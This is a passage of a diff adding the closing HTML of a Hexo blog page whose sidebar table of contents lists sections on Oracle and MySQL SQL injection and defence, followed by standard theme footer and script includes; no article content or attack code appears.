+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第六节：ORACLE数据库注入及防御"><span class="nav-number">1.</span> <span class="nav-text">第六节：ORACLE数据库注入及防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle安全配置"><span class="nav-number">1.1.</span> <span class="nav-text">Oracle安全配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle实战注入"><span class="nav-number">1.2.</span> <span class="nav-text">Oracle实战注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL实战注入"><span class="nav-number">1.3.</span> <span class="nav-text">MySQL实战注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">1.3.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结-1"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zoukba</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.6.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.6.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.6.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+  <script src="/js/src/js.cookie.js?v=6.6.0"></script>
+  <script src="/js/src/scroll-cookie.js?v=6.6.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
